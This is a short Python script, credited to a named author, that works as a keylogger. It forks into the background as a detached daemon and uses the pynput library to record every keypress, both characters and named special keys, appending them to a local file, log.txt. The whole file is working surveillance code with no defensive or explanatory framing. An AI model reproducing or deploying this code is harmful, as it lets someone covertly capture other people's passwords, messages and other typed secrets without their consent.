#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Andre Augusto Giannotti Scota (https://sites.google.com/view/a2gs/)

from os import fork, umask, setsid, chdir
from sys import exit
from pynput.keyboard import Key, Listener

kbuf = ""

def d():
	if fork() > 0:
		exit(0)

	chdir('./')
	setsid()
	umask(0)

def kp(k):
	global kbuf

	if k == Key.enter:
		kbuf += ' ENTER\n'
		wl()

	elif k == Key.space:
		kbuf += ' '
		wl()

	elif k == Key.esc:
		kbuf += ' ESC\n'
		wl()

	elif k == Key.backspace:
		kbuf += ' BACKSPACE\n'
		wl()

	elif k == Key.caps_lock:
		kbuf += ' CAPSLOCK\n'
		wl()

	elif k == Key.ctrl or k == Key.ctrl_l:
		kbuf += ' L_CTRL\n'
		wl()

	elif k == Key.ctrl_r:
		kbuf += ' R_CTRL\n'
		wl()

	elif k == Key.alt or k == Key.alt_l:
		kbuf += ' L_ALT\n'
		wl()

	elif k == Key.alt_r or k == Key.alt_gr:
		kbuf += ' R_ALT\n'
		wl()

	elif k == Key.delete:
		kbuf += ' DEL\n'
		wl()

	elif k == Key.down:
		kbuf += ' DOWN\n'
		wl()

	elif k == Key.end:
		kbuf += ' END\n'
		wl()

	elif k == Key.home:
		kbuf += ' HOME\n'
		wl()

	elif k == Key.left:
		kbuf += ' LEFT\n'
		wl()

	elif k == Key.page_down:
		kbuf += ' P_DOWN\n'
		wl()

	elif k == Key.page_up:
		kbuf += ' P_UP\n'
		wl()

	elif k == Key.right:
		kbuf += ' RIGHT\n'
		wl()

	elif k == Key.shift or k == Key.shift_l:
		kbuf += ' L_SHIFT\n'
		wl()

	elif k == Key.shift_r:
		kbuf += ' R_SHIFT\n'
		wl()

	elif k == Key.tab:
		kbuf += ' TAB\n'
		wl()

	elif k == Key.up:
		kbuf += ' UP\n'
		wl()
	elif k == Key.insert:
		kbuf += ' INSERT\n'
		wl()

	elif k == Key.menu:
		kbuf += ' MENU\n'
		wl()

	elif k == Key.num_lock:
		kbuf += ' NUMLOCK\n'
		wl()

	elif k == Key.pause:
		kbuf += ' PAUSE\n'
		wl()

	elif k == Key.print_screen:
		kbuf += ' SYSRQ\n'
		wl()

	elif k == Key.scroll_lock:
		kbuf += ' SCROLLLOCK\n'
		wl()

	elif k == Key.f1:
		kbuf += ' F1\n'
		wl()

	elif k == Key.f2:
		kbuf += ' F2\n'
		wl()

	elif k == Key.f3:
		kbuf += ' F3\n'
		wl()

	elif k == Key.f4:
		kbuf += ' F4\n'
		wl()

	elif k == Key.f5:
		kbuf += ' F5\n' 
		wl()

	elif k == Key.f6:
		kbuf += ' F6\n'
		wl()

	elif k == Key.f7:
		kbuf += ' F7\n'
		wl()

	elif k == Key.f8:
		kbuf += ' F8\n'
		wl()

	elif k == Key.f9:
		kbuf += ' F9\n'
		wl()

	elif k == Key.f10:
		kbuf += ' F10\n'
		wl()

	elif k == Key.f11:
		kbuf += ' F11\n'
		wl()

	elif k == Key.f12:
		kbuf += ' F12\n'
		wl()

	elif k == Key.f13:
		kbuf += ' F13\n'
		wl()

	elif k == Key.f14:
		kbuf += ' F14\n'
		wl()

	elif k == Key.f15:
		kbuf += ' F15\n'
		wl()

	elif k == Key.f16:
		kbuf += ' F16\n'
		wl()

	elif k == Key.f17:
		kbuf += ' F17\n'
		wl()

	elif k == Key.f18:
		kbuf += ' F18\n'
		wl()

	elif k == Key.f19:
		kbuf += ' F19\n'
		wl()

	elif k == Key.f20:
		kbuf += ' F20\n'
		wl()

	elif k == Key.cmd or k == Key.cmd_l:
		kbuf += ' L_META\n'
		wl()

	elif k == Key.cmd_r:
		kbuf += ' R_META\n'
		wl()

	elif k == Key.media_play_pause:
		kbuf += ' PLAYPAUSE\n'
		wl()

	elif k == Key.media_volume_mute:
		kbuf += ' MUTE\n'
		wl()

	elif k == Key.media_volume_down:
		kbuf += ' VOLDOWN\n'
		wl()

	elif k == Key.media_volume_up:
		kbuf += ' VOLUP\n'
		wl()

	elif k == Key.media_previous:
		kbuf += ' PREVSONG\n'
		wl()

	elif k == Key.media_next:
		kbuf += ' NEXTSONG\n'
		wl()

	else:
		try:
			kbuf += k.char
		except:
			pass

def wl():
	global kbuf

	f = open('log.txt', 'a')
	f.write(kbuf)
	f.close()
	kbuf = ""

d()

with Listener(on_press = kp) as listener:
	listener.join()
